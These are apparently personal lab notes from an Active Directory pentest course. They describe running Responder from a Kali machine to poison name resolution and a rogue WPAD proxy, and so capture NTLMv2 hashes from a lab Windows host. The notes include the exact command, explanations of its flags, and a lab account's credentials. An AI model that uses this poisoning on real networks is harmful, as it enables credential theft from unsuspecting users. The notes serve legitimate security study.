# On Kali (Attacker):
---
- We need to run responder as `sudo`.
- `sudo responder -I tun0 -dwv`
	- `I` -> interface
	- `d` -> DHCP (enable answers for DHCP broadcast request)
	- `w` -> Start `WPAD` rogue proxy server. Allows browser to automatically discover our `proxy` without any configuration. 
	- `P` -> ProxyAuth, force authentication for the proxy. (==not needed so can skip if error occurs==)
	- `v` -> Verbose


![[Pasted image 20250328043508.png]]

# On The Punisher Machine:
----
- Login as local user `MARVEL\fcastle : Password1`
![[Pasted image 20250328141859.png]]

# On Kali:
---
- Got the NTLMv2`hashes`:
![[Pasted image 20250328143245.png]]
- ==**NTLMv2 hashes change everytime (though password is always same), NTLMv1 hashes does not change**==. 